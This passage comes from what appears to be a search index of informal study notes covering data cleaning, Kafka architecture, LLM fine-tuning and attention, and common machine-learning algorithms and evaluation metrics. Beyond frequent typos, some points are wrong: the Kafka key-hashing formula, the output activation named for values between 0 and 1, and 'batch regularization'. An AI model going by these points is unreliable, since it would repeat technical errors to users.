Strange naming conventions. \u2022 Typos. \u2022 Incorrect capitalization. \u2022 Inconsistencies can cause mislabeled categories or classes. \u2022 \u201cN/A\u201d and \u201cNot Applicable\u201d both appear, but they should be analyzed as the same category.</p> <p>Step 3: Filtering Unwanted Outliers \u2022 There will be one-off observations where do not appear to fit within the data. \u2022 Just because an outlier exists, doesn\u2019t mean it is incorrect. \u2022 This task is needed to determine the validity. \u2022 If an outlier proves to be irrelevant for analysis or is a mistake, consider removing it.</p> <p>Step 4: Handling Missing Data \u2022 You can\u2019t ignore missing data because of many algorithms. \u2022 There are a couple of ways to deal with missing data. \u2022 Observations that have missing values can be dropped, but doing this will drop or lose information, so be mindful of this before removing it. \u2022 Secondly you can input missing values based on other observations. \u2022 You might alter the way the data is used to effectively navigate null values</p> <p>Step 5: Validation \u2022 Does the data make sense? \u2022 Does the data follow the appropriate rules for its field? \u2022 Does it prove or disprove your working theory, or bring any insight to light? \u2022 Can you find trends in the data to help you form your next theory? \u2022 If not, is that because of a data quality issue?</p> <p>DT is the process of converting data from one format or structure into another.</p> <p>Feature Extraction (Reduction) Techniques \u2022 Unsupervised \u2022 Latent Semantic Indexing (LSI): truncated SVD \u2022 Independent Component Analysis (ICA) \u2022 Principal Component Analysis (PCA) \u2022 Supervised \u2022 Linear Discriminant Analysis (LDA) \u2022 Canonical Correlation Analysis (CCA) \u2022 Partial Least Squares (PLS)</p>"},{"location":"Data%20Science/Finetune/","title":"Finetune","text":"<p>PEFT (Parameter Efficient Fine Tunning Technique)</p> <pre><code>Lora - Low Rank Adaptation of Large Language model\nQloara -\n</code></pre> <p>Some of the weights of the LLM will be freezed </p>"},{"location":"Data%20Science/Kafka/","title":"Kafka","text":""},{"location":"Data%20Science/Kafka/#kafka-topics","title":"Kafka Topics","text":"<ul> <li>Topic : A particular stream of data</li> <li>Like a table in database</li> <li>Can have many topics required </li> <li>A topic is identified by name </li> <li>Any kind of message format (textfile, Binary, JSON) </li> <li>The sequence of messages is called data stream </li> <li>You cannot query topics, kafka producers to send data and kafka consumers to read the data </li> </ul> <p>Topics are split in partitions      - Messages within the partition are orderd     - Each message within a partition gets an increment id, called offset      - </p> <p>Topics are immutable, once data is written to a partition, it cannot be changed  Data is kept for a week (configurable, default 1 week ) Offset have a meaning for a specific partition  Offset are not reused even if previous message have been deleted  Order is guaranteed only within a partition (not across partitions) Data is assigned randomly to a partition unless a key is provided For a topic can have many partitions </p>"},{"location":"Data%20Science/Kafka/#producers","title":"Producers","text":"<p>Producers write to topics also knows which partition to use (which kafka broker has it) Once the data is written to a partition. It cannot be changed (immutability) Kafka broker failure, producers will automatically recover  Data is kept only for a limited time </p> <p>Producer: Message key - Producers can choose to send key with the message - If key = null, data is sent round robin  - If key != null then all messages for that key will always go to the same partion (hashing)  - A key are typically sent if you need message ordering for a specific field </p>"},{"location":"Data%20Science/Kafka/#kafka-message-anatomy","title":"Kafka Message Anatomy","text":""},{"location":"Data%20Science/Kafka/#kafka-message-serializer","title":"Kafka Message Serializer","text":"<p>Kafka only accepts bytes as an input from producers and sends bytes out as an output to consumers.  Message serialziation means transforming objects / data into bytes  They are used on the value and key  Common serilizer := String, Int, Avro, JSON, Protobuf </p>"},{"location":"Data%20Science/Kafka/#kafka-message-key-hashing","title":"Kafka Message Key Hashing","text":"<p>A kafka partitioner is a code logic that takes a record and determines to which partition to send it  Key hashing is the process of determining the mapping of a key to partition </p> <p>targetPartition = Math.abs(Utils.murmur2(keyBytes)) % (numPartitions - 1)</p>"},{"location":"Data%20Science/Kafka/#consumers","title":"Consumers","text":"<p>Consumers read data from  a topic - pull model  Consumers automatically know which broker to read from  If borker failure, consumers know how to recover  Data is read in order from low to high offset (within each partition)</p>"},{"location":"Data%20Science/Kafka/#consumer-deserialzier","title":"Consumer Deserialzier","text":"<p>Deserilizer indicate how to transform bytes into objects  They are used on the value and the key of the message  The serialziation / deserialzier type must not change during a topic lifecycle (new topic)</p>"},{"location":"Data%20Science/Kafka/#consumer-groups","title":"Consumer Groups","text":"<p>All the consumers in an application read data as a consumer groups Each consumer within a group reads from exclusive partitions  If have more consumers than partitions, some consumers will inactive  In apache kafka it is acceptable to have multiple consumer groups on the same topic  But within 1 consumer group only partition can be read by 1 consumer  </p>"},{"location":"Data%20Science/Kafka/#delivery-for-semantics","title":"Delivery for semantics","text":"<p>Default, java consumers will automatically commit offset (at least on) There are 3 delivery semantics if choose commit manually, </p> <pre><code>- At least once (prefered)\n    * offsets are commited after the message is processed \n    * if the processing goes wrong, the message is processed \n    * This can result in duplicate processing of messages, !Make sure processing is idempotent\n            (Processing again the messages wont impact your system)\n\n- At most once \n    * Offsets are commited as soon as messages are recieved \n    * If the processing goes wrong, some messages will be lost (wont be reading again)\n\n- Exactly One \n    * for kafka -&gt; use the transactional API \n    * for kafka - external system workflow, use an idempotent consumer\n</code></pre>"},{"location":"Data%20Science/Kafka/#kafka-brokers","title":"Kafka Brokers","text":"<p>A kafka cluster is composed of multiple brokers(servers) Each broker is identified with its ID  Each broker contains certain topic partitions  After connecting to any broker (called a bootstrap broker), you will be connected to the entire cluster      (Kafka clients have smart mechanics for that)</p> <p>Data is distributed, broker 1 does not have any Topic B data (not belonging)</p>"},{"location":"Data%20Science/Kafka/#kafka-broker-dicovery","title":"Kafka Broker Dicovery","text":"<p>Every kafka broker is also called a bootstrap server  That means only required to connect to 1 broker and kafka client knows how to connect to entire cluster Each broker knows about all brokers, topics and partitions (metadata)</p>"},{"location":"Data%20Science/Kafka/#topic-replication-factor","title":"Topic Replication Factor","text":"<p>Topic should have a replication factor &gt; 1  This way if a broker is down, another broker can serve the data </p>"},{"location":"Data%20Science/Kafka/#leader","title":"Leader","text":"<p>Any time only 1 broker can be a leader for a given partition Producers can only send data to the broker that is leader of a partition  The other brokers will replicate the data  Each partition has one leader and multiple ISR(in sync replica) </p> <p>Possible to configure consumers to read from the closet replica (kafka 2.4 + ) This helps in latency, decrease network cost </p>"},{"location":"Data%20Science/Kafka/#producer-acknowledgement-acks","title":"Producer Acknowledgement (Acks)","text":"<p>ack  = 0 (producer wont wait for ack [possible data loss]) ack  = 1 (producer will wait for leader ack [limited data loss]) acks = all (leader + replicas ack [no data loss])</p>"},{"location":"Data%20Science/Kafka/#zookeeper","title":"ZooKeeper","text":"<p>Manages brokers (keeps a list of them) Helps in performing leader election for partition  Sends notifications to kafka in case of change </p> <p>!!! Version are not supported Less secure In future without ZooKeeper</p> <p>Kafka Brokers -  Kafka client - </p>"},{"location":"Data%20Science/Kafka/#kafka-kraft","title":"Kafka KRaft","text":"<p>ZooKeeper shows scaling issues when kafka clusters have &gt; 100,000 partitions  By removing ZooKeeper, Kafka can scale to 1 million of partitions </p> <p>Kafka is now implementing Raft protocol (KRaft) in order to replace ZooKeeper</p>"},{"location":"Data%20Science/LLMProduction/","title":"LLMProduction","text":"<p>Hidden Markov models (HMM) markov chain essentially add state to the N-gram models, storing probabilities using hidden state.</p> <p>Attention is a mathematical shortcut that gives the model a mechanism for solving larger context windows faster by telling the model through an emergent mathematical formular which parts of an input to consider and how much. Instead of key-pair (dictionary) contextual query is added.</p> <p>The dot product attention - captures the relationship between each word in the query and every word in the key When queries and keys are part of the same sentences known as 'bi-directional self attention' Queries and keys comes from same sentence is casual attention</p> <p>Convolutions are good in computer vision, not in NLP LLM are the solution for the NLP</p>"},{"location":"Data%20Science/ML_1/","title":"ML 1","text":"<p>Principal Component Analysis (PCA) \u2022 PCA is used to compress a dataset onto a lower-dimensional featuresubspace. \u2022 Feature selection finds a subset of features while PCA produces asmaller new set. \u2022 PCA helps us to identify patterns in data based on the correlation between features. \u2022 PCA aims to find the directions of maximum variance in highdimensional data.</p> <p>Applications of PCA in Machine Learning \u2022 PCA is used to visualize multidimensional data. \u2022 It is used to reduce the number of dimensions in healthcare data. \u2022 PCA can help resize an image. \u2022 It can be used in finance to analyze stock data and forecast returns. \u2022 PCA helps to find patterns in the high-dimensional datasets.</p> <p>Overfitting Vs Underfitting  Overfitting \u2022 Good performance on the training data, poor generalization to other data. \u2022 A high accuracy measured on the training set.</p> <p>Underfitting \u2022 Poor performance on the training data and poor generalization to other data. \u2022 Reducesthe accuracy and produces unreliable predictions.</p> <p>Regression Analysis in Machine Learning \u2022 Regression analysis is a statistical method to model the relationship between a dependent and independent variables. \u2022 Regression helps to understand how the value of the dependent variable is changing. \u2022 It predicts continuous/real values such as temperature, age, salary, price, etc.</p> <p>\u2022 Dependent Variable: The main factor in Regression analysis which we want to predict or understand is called the dependent variable. It is also called target variable.</p> <p>\u2022 Independent Variable:  The factors which affect the dependent variables, or which are used to predict the values of the dependent variables are called independent variable, also called as a predictor.</p> <p>\u2022 Outliers: Outlier is an observation which contains either very low value or very high value in comparison to other observed values. \u2022 Multicollinearity: If the independent variables are highly correlated with each other than other variables, then such condition is called Multicollinearity. It should not be present in the dataset, because it creates problem while ranking the most affecting variable.</p> <p>\u2022 Underfitting and Overfitting: If our algorithm works well with the training dataset but not well with test dataset, then such problem is called Overfitting. And if our algorithm does not perform well even with training dataset, then such problem is called underfitting    </p> <p>Why Regression Analysis? \u2022 Regression estimates the relationship between the target and theindependent variable. \u2022 It is used to find the trends in data. \u2022 It helps to predict real/continuous values. \u2022 By performing the regression, we can confidently determine the most important factor, the least important factor</p> <p>Types of Regression  \u2022 Linear Regression \u2022 Logistic Regression  \u2022 Polynomial Regression  \u2022 Support Vector Regression  \u2022 Decision Tree Regression  \u2022 Random Forest Regression  \u2022 Ridge Regression  \u2022 Lasso Regression</p> <p>Linear Regression \u2022 Linear regression is a statistical regression method which is used for predictive analysis. \u2022 Linear regression shows the linear relationship between the independent variable (X-axis) and the dependent variable (Y-axis). \u2022 If there is only one input variable (x), then such linear regression is called simple linear regression. \u2022 If there is more than one input variable, then such linear regression is called multiple linear regression. \u2022 \ud835\udc4c = \ud835\udc4e\ud835\udc4b + \ud835\udc4f \u2022 Y = dependent variables (target variables), X= Independent variables (predictor variables), a and b are the linear coefficients</p> <p>Examples: \u2022 Analyzing trends and sales estimates. \u2022 Salary forecasting. \u2022 Real estate prediction. \u2022 Arriving at ETAs in traffic.</p> <p>Logistic Regression</p> <p>\u2022 Logistic regression is another supervised learning algorithm which isused to solve the classification problems. \u2022 Logistic regression algorithm works with categorical variables. \u2022 It is a predictive analysis algorithm which works on the concept of probability. \u2022 Logistic regression uses sigmoid function or logistic function which is a complex cost function. \u2022 The sigmoid function is used to model the data in logistic regression. \u2022 f (x) = 1 / 1 + e ^ -x</p> <p>Support Vector Machine</p> <p>\u2022 One of the most popular Supervised Learning algorithms for Classification as well as Regression problems. \u2022 The goal is to create the best line or decision boundary that can segregate n-dimensional space into classes. \u2022 This best decision boundary is called a hyperplane. \u2022 SVM chooses the extreme points/vectors that help in creating the hyperplane. \u2022 These extreme cases are called as support vectors. \u2022 Support vector creates a decision boundary between these two data (cat and dog) and choose extreme cases (support vectors), it will see the extreme case of cat and dog. Based on the support vectors, it will classify it as a cat. \u2022 SVM algorithm can be used for Facedetection, image classification, textcategorization, etc.</p> <p>Types of SVM</p> <p>\u2022 Linear SVM \u2022 Linear SVM is used for linearly separable data. \u2022 If a dataset can be classified into two classes by using a single straight line. \u2022 Non-linear SVM \u2022 Non-Linear SVM is used for non-linearly separated data. \u2022 If a dataset cannot be classified by using a straight line, then such data is termed as non-linear data.</p> <p>Linear SVM</p> <p>\u2022 SVM algorithm helps to find the best line or decision boundarywhich is the hyperplane. \u2022 SVM algorithm finds the closest point of the lines from both theclasses. \u2022 These points are called support vectors. \u2022 The distance between the vectors and the hyperplane is called as margin. \u2022 The goal of SVM is tomaximize this margin. Thehyperplane with maximum margin is called the optimal hyperplane.</p> <p>Decision Trees</p> <p>\u2022 Decision Tree is a Supervised learning technique that can be used for both classification and Regression problems. \u2022 It is a tree-structured classifier. \u2022 Internal nodes represent the features of a dataset, branches represent the decision rules, and each leaf node represents the outcome. \u2022 In a Decision tree, there are two nodes, which are the Decision Node and Leaf Node. \u2022 Decision nodes are used to make any decision whereas Leaf nodes are the output of those decisions. \u2022 It is called a decision tree because, similar to a tree, it starts with the root node. \u2022 In order to build a tree, the Classification and Regression Tree (CART) algorithm is used. \u2022 A decision tree simply asks aquestion and based on the answer (Yes/No), it furthersplit the tree into subtrees. \u2022 Decision Trees usually mimic human thinking ability while making a decision, so it is easy to understand. \u2022 The logic behind the decision tree can be easily understood becaus it shows a tree-like structure</p> <p>Hunt\u2019s algorithm \u2756 Most decision tree induction algorithms are based on Hunt\u2019s algorithm</p> <p>Pros &amp; Cons  Pros \u2022 It is simple to understand as it follows the same process which a human follow while making any decision in real-life. \u2022 It can be very useful for solving decision-related problems. \u2022 It helps to think about all the possible outcomes for a problem. \u2022 There is less requirement of data cleaning compared to other algorithms.  Cons \u2022 The decision tree contains lots of layers, which makes it complex. \u2022 It may have an overfitting issue, which can be resolved using the Random Forest algorithm. \u2022 For more class labels, the computational complexity of the decision tree may increase.</p> <p>K-Nearest Neighbor (K-NN)</p> <p>\u2022 K-NN is one of the simplest ML algorithms. \u2022 K-NN algorithm assumes the similarity between the new case/data and available cases and put the new case into the category that is most similar to the available categories. \u2022 K-NN algorithm stores all the available data and classifies a new data point based on the similarity. \u2022 K-NN algorithm can be used for Regression as well as for Classification.</p> <p>Pros &amp; Cons of K-NN</p> <p>Pros \u2022 It is simple to implement. \u2022 It is robust to the noisy training data. \u2022 It can be more effective if the training data is large.</p> <p>Cons \u2022 Always needs to determine the value of K which may be complex some time. \u2022 The computation cost is high because of calculating the distance between the data points for all the training samples. Random Forest \u2022 Random Forest is a popular machine learning algorithm that belongs to the supervised learning technique. \u2022 It can be used for both Classification and Regression problems in ML. \u2022 It is based on the concept of ensemble learning, which is a process of combining multiple classifiers to solve a complex problem. \u2022 Random Forest is a classifier that contains a number of decision trees on various subsets of the given dataset.</p> <p>Working Model of Random Forest \u2022 It is possible that some decision trees may predict the correct output, while others may not. \u2022 But together, all the trees predict the correct output. \u2022 There should be some actual values in the feature variable of the dataset so that the classifier can predict accurate results. \u2022 The predictions from each tree must have very low correlations</p> <p>Why Random Forest? \u2022 It takes less training time as compared to other algorithms. \u2022 It predicts output with high accuracy, even for the large dataset it runs efficiently. \u2022 It can also maintain accuracy when a large proportion of data is missing.</p> <p>Applications of Random Forest \u2022 Banking: Banking sector mostly uses this algorithm for the identification of loan risk. \u2022 Medicine: With the help of this algorithm, disease trends and risks of the disease can be identified. \u2022 Land Use: We can identify the areas of similar land use by this algorithm. \u2022 Marketing: Marketing trends can be identified using this algorithm</p> <p>Pros &amp; Cons of Random Forest Pros \u2022 It can perform both Classification and Regression tasks. \u2022 It is capable of handling large datasets with high dimensionality. \u2022 It enhances the accuracy of the model and prevents the overfitting issue.  Cons \u2022 Although random forest can be used for both classification and regression tasks, it is not more suitable for Regression tasks.</p> <p>Unsupervised Learning </p> <p>\u2022 Clustering \u2022 Dimenstionality Reduction \u2022 Association Rule Mining</p> <p>Dimenstionality Reduction Methods  - PCA (Principal Component Analysis)  - LDA (Linear Discriminant Analysis)  - NMF (Non-negative Matrix factorization)  - LLE (Locally Linear Embedding)  - Isomap</p> <p>Clustering in Machine Learning</p> <p>\u2022 A way of grouping the data points into different clusters, consisting of similar data points. \u2022 Clustering is an unsupervised learning method; hence no supervision is provided to the algorithm. \u2022 The objects with the possible similarities remain in a group that has less or no similarities with another group. \u2022 After applying the clustering technique, each cluster or group is provided with a cluster-ID</p> <p>Clustering in Machine Learning</p> <p>\u2022 Market Segmentation \u2022 Statistical data analysis \u2022 Social network analysis \u2022 Image segmentation \u2022 Anomaly detection</p> <p>Use cases</p> <p>\u2022 In Identification of Cancer Cells: It divides the cancerous and noncancerous data sets into different groups. \u2022 In Search Engines: It does it by grouping similar data objects in one group that is far from the other dissimilar objects.  The accurate result of a query depends on the quality of the clustering algorithm used. \u2022 Customer Segmentation: It is used in market research to segment the customers based on their choice and preferences. \u2022 In Biology: It is used in the biology stream to classify different species of plants and animals  using the image recognition technique. \u2022 In Land Use: The clustering technique is used in identifying the area of similar lands use in the GIS database.</p> <p>Types of Clustering Methods</p> <p>\u2022 Partitioning Clustering \u2022 Density-Based Clustering \u2022 Distributional Clustering \u2022 Hierarchical Clustering \u2022 Fuzzy Clustering</p> <p>Partitioning Clustering</p> <p>\u2022 A type of clustering that divides the data into non-hierarchical groups. \u2022 It is also known as the centroid-based method. \u2022 The most common example of partitioning clustering is the KMeans Clustering algorithm. \u2022 The dataset is divided into a set of groups, where K is used to define the number of pre-defined groups. \u2022 The cluster center is created in such a way that the distance between the data points of one cluster is minimum.</p> <p>K-Means Pros &amp; Cons</p> <p>Pros \u2022 Simple, understandable \u2022 Quick \u2022 Instances automatically set to clusters  Cons \u2022 All instances lead to a single cluster \u2022 Sensitive to more outliers \u2022 Cluster must be picked beforehand</p> <p>Distributional Clustering</p> <p>\u2022 The data is divided based on the probability of how a dataset belongs to a particular distribution. \u2022 The grouping is done by assuming some distributions commonly Gaussian Distribution. \u2022 The example of this type is the Expectation-Maximization Clustering algorithm. \u2022 This is based on Gaussian Mixture Models (GMM).</p> <p>Hierarchical Clustering</p> <p>\u2022 In this algorithm, we develop the hierarchy of clusters in the form of a tree. \u2022 This tree-shaped structure is known as the dendrogram. \u2022 Sometimes the results of K-means clustering and hierarchical clustering may look similar. \u2022 The hierarchical clustering technique has two approaches: Agglomerative &amp; Divisive. \u2022 Hierarchical agglomerative clustering (HAC) merges the most similar clusters, starting with each data point as a separate cluster. \u2022 Divisive clustering starts by considering all the data points into a big single cluster and splitting them into smaller heterogeneous clusters continuously until all data points are in their cluster.</p> <p>Agglomerative Hierarchical Clustering</p> <p>\u2022 Hierarchical agglomerative clustering (HAC) merges the most similar clusters, starting with each data point as a separate cluster. \u2022 Use Euclidean distance to calculate the similarity. \u2022 Use Single linkage, Complete linkage, and Centroid linkage methods to calculate the distance between clusters.</p> <p>Association Rule Learning</p> <p>\u2022 Association rule learning is a type of unsupervised learning technique. \u2022 It checks for the dependency of one data item on another data item and maps accordingly. \u2022 It is based on different rules to discover the interesting relations between variables in the database. \u2022 It is employed in Market Basket analysis, Web usage mining, continuous production, etc</p> <p>How does Association Rule Learning Work?</p> <p>\u2022 Association rule learning works on the concept of If and Else Statement, such as if A then B. \u2022 Here the If element is called antecedent, and then statement is called as Consequent. \u2022 These types of relationships where we can find out some association or relation between two items is known as single cardinality. \u2022 It is all about creating rules, and if the number of items increases, then cardinality also increases.</p> <p>Mining Association Rules</p> <p>\u2022 Two step approach \u2022 Step 1 -&gt; Frequent Itemset Generation \u2022 Generate all itemsets whose support &gt;= minsup \u2022 Step 2 -&gt; Rule Generation \u2022 Generate high confidence rules from each frequent itemset where each rule is a binary partitioning of a frequent itemset</p> <p>Matrix factorization and singular value decomposition is a way to simplify data by reducing  rows and columns </p> <p>Apriori Algorithm</p> <p>\u2022 This algorithm uses frequent datasets to generate association rules. \u2022 This algorithm uses a breadth-first search and Hash Tree to calculate the itemset efficiently. \u2022 It is mainly used for market basket analysis and helps to understand the products that can be bought together. \u2022 It can also be used in the healthcare field to find drug reactions for patients</p> <p>Ensemble Methods in Machine Learning</p> <p>\u2022 Machine learning models are often trained with a variety of different methods in order to create a more accurate prediction. \u2022 Ensemble methods are one way to do this and involve combining the predictions  of several  different models in order to get a more accurate result. \u2022 It combines low performing classifiers and combine individual model prediction for the final prediction. \u2022 Based on type of base learners, ensemble methods can be categorized as homogeneous and heterogeneous ensemble methods.</p> <p>Ensemble Learning Methods</p> <p>\u2022 Bagging \u2022 Boosting \u2022 Stacking</p> <p>Bagging</p> <p>\u2022 Bagging is an acronym for Bootstrapped Aggregation. \u2022 Bootstrapping means random selection of records with replacement from the training dataset. \u2022 The idea behind bagging is combining the results of multiple models to get a generalized result. \u2022 Bagging technique works by creating several models, called \u201cbags\u201d, each of which is based on a  different randomly-selected sample of the data.</p> <p>Boosting</p> <p>\u2022 If a data point is incorrectly predicted by the first model, and then the next will combining the predictions provide better results? Such situations are taken care of by boosting. \u2022 Boosting is a sequential process, where each subsequent model attempts to correct the errors of the previous model. \u2022 After classification, sample weights are changed. Weight of correctly classified sample is reduced, and weight of incorrectly classified sample is increased. \u2022 Boosting can help data scientists adjust the weights of the models so that the better models have more influence on the final prediction.</p> <p>Stacking</p> <p>\u2022 Stacking uses predictions from multiple models (for example decision tree, KNN or SVM) to build a new model. \u2022 The models are \u201cstacked\u201d on top of each other, and the predictionsfrom each model are combined to produce a final prediction. \u2022 This can be used for regression or classification tasks, and it has been shown to outperform traditional machine learning methods. \u2022 The ultimate model is powerful because it can combine the strengths of different models to produce a more accurate prediction. \u2022 Overall, it is difficult to implement, and it requires a great deal of tuning to get the best results. \u2022 The stacking ensemble method can be used for solving a variety of machine learning problems, such as regression and classification. \u2022 For example, imagine that you are trying to predict the price of a house. \u2022 You could use a model to predict the price of a house based on its size and location, and then use a second model to predict the price of a house based on its age and condition. \u2022 The predictions from each model would be combined to produce a final prediction for the price of the house.</p> <p>Model Evaluation</p> <p>\u2022 Model evaluation is a process of assessing the model\u2019s performance on a chosen evaluation setup \u2022 Model selection is the process of choosing the best classifier for a given task \u2022 It is done by comparing various model candidates on chosen evaluation metrics \u2022 Choosing the correct evaluation schema, whether a simple train test split or a complex cross-validation strategy</p> <p>Model selection in machine learning</p> <p>\u2022 Resampling methods \u2022 Simple techniques of rearranging data samples to inspect if the model performs well on data samples \u2022 Resampling helps us understand if the model will generalize well \u2022 Random split \u2022 Used to randomly sample a percentage of data into training, testing, and preferably validation sets \u2022 Random splitting will prevent a biased sampling of data: test set is used for model evaluation</p> <p>Model selection in machine learning</p> <p>\u2022 Time-Based Split \u2022 There are some types of data where random splits are not possible \u2022 If we have to train a model for weather forecasting, we cannot randomly divide the data into training and testing sets. \u2022 K-Fold Cross-Validation \u2022 Randomly shuffling the dataset and then splitting it into k groups \u2022 Model is tested on the test group and the process continues for k groups \u2022 Stratified K-Fold \u2022 unlike in k-fold cross-validation, the values of the target variable is taken into consideration in stratified k-fold.</p> <p>How to choose performance metrics</p> <p>\u2022 Right choice of an evaluation metric is crucial and often depends upon the problem \u2022 A clear understanding of a wide range of metrics can help the evaluator to chance upon an appropriate match \u2022 Types         \u2022 Classification metrics         \u2022 Regression metrics         \u2022 Clustering metrics</p> <p>Classification evaluation metrics</p> <p>Log loss \u2022 Log loss is a very effective classification metric and is equivalent to -1* log (likelihood function) where the likelihood function suggests how likely the model thinks the observed set of outcomes was Gain &amp; Lift \u2022 Lift charts measure the improvement that a model brings in compared to random predictions. \u2022 Gain and lift charts evaluate the model on portions of the whole population K-S chart \u2022 The K-S chart determines the degree of separation between positive class distribution and the negative class distribution \u2022 he higher the difference, the better is the model at separating the positive and negative cases</p> <p>Regression evaluation metrics</p> <p>\u2022 Regression models provide a continuous output variable, unlike classification models that have discrete output variables \u2022 Mean Squared Error \u2022 Calculatesthe difference between the actual value and the predicted value (error) \u2022 Root Mean Squared Error \u2022 Helps to bring down the scale of the errors closer to the actual values, making it more interpretable \u2022 Mean Absolute Error \u2022 Mean of the absolute error values (actuals \u2013 predictions)</p> <p>Clustering evaluation metrics</p> <p>\u2022 Clustering algorithms predict groups of datapoints and hence, distance-based metrics are most effective \u2022 Dunn Index \u2022 Focuses on identifying clusters that have low variance \u2022 Silhouette Coefficient \u2022 Tracks how every point in one cluster is close to every point in the other clusters in the range of -1 to +1 \u2022 Elbow method \u2022 Determine the number of clusters by plotting the number of clusters on the x-axis against  the percentage of variance explained on the y-axis</p> <p>Trade-offs in model selection Bias vs Variance \u2022 A model with high bias will oversimplify by not paying much attention to the training points \u2022 Bias occurs when a model is strictly ruled by assumptions \u2022 This leads to underfitting when the actual values are non-linearly related to the independent variables \u2022 A model with high variance will restrict itself to the training data by not generalizing for test points \u2022 Variance is high when a model focuses on the training set too much</p> <p>Ethics in machine learning Data \u2022 A good ML system needs lots of data. But where are we going to get this data? \u2022 Is it alright if you steal the someone\u2019s private data?  Algorithms \u2022 What if a patented algorithm, in the right hands can help millions? \u2022 Can one\u2019s own sense of right and wrong be used to reverse engineer the algorithm to benefit others?</p> <p>Results \u2022 If you get the same practice questions in the exam, is your score on the exam a good measure of how much you learnt? \u2022 Or is it a measure of how much you were able to memorize?</p>"},{"location":"Data%20Science/ML_2/","title":"ML 2","text":"<p>In 1943 </p> <p>Neurophysiologist Warren McCulloh Mathematician Walter Pitts Propositional Logic</p> <p>1960s winter 1990s popular machine Learning models were developed</p> <p>Due to gaming industry high GPU power GPU's are available for training</p> <p>TLU = Threshold logic unit LTU = Linear Threshold unit</p> <p>Cells that fire together, wire together - Hebb's rule</p> <p>Perceptron - No probability Logistic Regression - Probability</p> <p>Researches were disappointed by XOR problem) : true on Logistic Regression but high expectation</p> <p>Stacking multiple pecerptron (MLP) MLP solves XOR problem</p> <p>Feedforward Neural Network(FNN) People say DNN even a shallow one</p> <p>Train MLP? -&gt; 1986 Back propagation was introduced  (Simply Gradient Descent)</p> <p>Connection weight should be initialize randomly</p> <p>If output between 0 and 1 = ReLU/Softplus</p> <p>MSE MASE if lot of outliers Huber loss for both</p> <p>Unsupervised Learning</p> <p>We have input features X but do not have output features Y</p> <p>Yann LeCun</p> <p>\"If intelligence was cake, unsupervised learning will be the cake, supervised learning will be the icing on the cake reinforcement learning will be the cherry on the cake\"</p> <p>Clustering - Goal is to group similar type of objects into clusters. </p> <p>Anomaly Detection ( Outlier detection ) - Goal is to learn what is normal data looks like, and use this to detect abnormal instances</p> <p>Density Estimation - Estimating PDF of the random process that generate datasets; used for anamoly detection</p> <p>customer segmentation</p> <p>There is no universal answer for what is cluster is, it really depends on the context and different algorithms</p> <p>from sklearn.cluster import KMeans k = 5 kmeans = KMeans(n_clusters = k) y_pred = kmeans.fit_predict(X)</p> <p>if you plot the cluster's decsion boundries you will get Voronoi Tessellation</p> <p>hard clustering - Assigning each instance into a single cluster soft clustering - score per cluster</p> <p>kmeans.transform(X_new)</p> <p>Dimensionality Reduction</p> <p>2 main dimenionality Reduction</p> <p>Proection  Manifold</p> <p>ANN</p> <p>from sklearn.datasets       import load_iris from sklearn.linear_model   import Perception</p> <p>MLP = Multi layer perceptron</p> <p>When an ANN contains deep stack of Neural Networks - (DNN)</p> <p>The hyperbolic tanget function     | tanh(z)  The rectified Linear Unit function | ReLU</p> <p>Sigmoid = S shape function  ReLU works better</p> <p>After model is created you must call <code>compile()</code> method </p> <p>Tensorboard is visulization purposes binary file --&gt; <code>event</code> each summary </p> <p>Transfer learning Already trained model for transfer learning </p> <p>CNN                    - Image processing RNN                    - Sequential Data Autoencoders           - Represenational Learning Generative adversarial - Model and generate data</p> <p>ReLU Leaky ReLU RRLU (Raqndomized Leaky ReLU) PReLU (Parametric Leaky ReLU)</p> <p>Outperform ReLU  ELU - Exponential Linear Unit SELU  Self normalized </p> <p>Momentum optimization and RMSProp  combination is     ADAM - Adaptive moment estimation</p> <p>Batch regularization was to solve vanishing gradient problem Dropout { Best Regularization }</p> <p>Alpha Dropout = to preserve mean and std in the input</p> <p>Max norm regularization </p> <p>Monte Carlo Dropout</p> <p>Gradient decent works best when all the items IID Independant Identically Distributed</p> <p>The most important layer in CNN is the convolutional layer. To have the same height and same width in the previous layer it is common to add zeros around in the inputs ZERO PADDING</p> <p>Padding must be either VALID or SAME</p> <p>if set to valid ; does not need zero padding SAME ; zero padding is required</p> <p>Inference [ Making a prediction for a new instance]</p> <p>Alexnet Resnet GoogleNet</p> <p>FCN - Fully convolutional Network</p>"},{"location":"Data%20Science/ML_3/","title":"ML 3","text":"<p>Artificial Intelligence  Machine Learning Deep Learning</p> <p>Foundational Models</p> <p>-- LLM -- Deep fakes</p> <p>[Machine Learning is the] field of study that gives computers the ability to learn without being explicitly programmed. \u2014Arthur Samuel, 1959</p> <p>A computer program is said to learn from experience E with respect to some task T and some performance measure P, if its performance on T, as measured by P, improves with experience E. \u2014Tom Mitchell, 1997</p> <p>Even though it is regression Logistic Regression is good for classification problems </p> <p>Unsupervised Learning</p> <p>Clustering \u2014K-Means \u2014DBSCAN \u2014Hierarchical Cluster Analysis (HCA) \u2022 Anomaly detection and novelty detection \u2014One-class SVM \u2014Isolation Forest</p> <p>Visualization and dimensionality reduction \u2014Principal Component Analysis (PCA) \u2014Kernel PCA \u2014Locally-Linear Embedding (LLE) \u2014t-distributed Stochastic Neighbor Embedding (t-SNE) \u2022 Association rule learning \u2014Apriori \u2014Ecla  </p> <p>Most semisupervised learning algorithms are combinations of unsupervised and supervised algorithms. For example, deep belief networks (DBNs) are based on unsu pervised components called restricted Boltzmann machines (RBMs) stacked on top of one another.</p> <p>Instance Based Learning  Model base Learning</p> <p>Feature Scaling</p> <p>Min max scaling Standardization</p> <p>Fine Tune Model</p> <p>Grid Search Randomized Search Ensemble methods</p> <p>Performance Measures</p> <p>Cross Validation Confusion Matrix Precision and recall Precision recall tradeoff ROC curve</p> <p>Bacth gradient descent Stochastic gradient decent Mini Batch gradient decent</p> <p>Extra trees (Extremely randomized Trees)</p> <p>Swiss Roll 2D manifold learning</p> <p>Randomized PCA Incremental PCA</p> <p>Locally linear Embedding (LLE) is a powerful nonlinear dimenstionality</p> <p>Multidimensional Scaling (MDS) Isomap t-Distributed Stochastic Neigbor Embedding (t-SNE) Linear Discriminant Analysis</p>"},{"location":"Data%20Science/ML_Systems/","title":"ML Systems","text":"<p>Two families of samples     - Non probability sampling     - Random sampling</p> <p>Non probability sampling - Convenience sampling - Snowball sampling  - Judgment sampling - Quota sampling</p> <p>Simple Random sampling  Stratified Sampling  Weighted Sampling  Reservoir sampling  Importance sampling </p> <p>Classical Text Processing  - Original Text - Stopword Removal - Lemmatization  - Contraction - Punctuation  - Lowercase - Tokenization - N-gram </p> <p>Missing values  - Missing not at 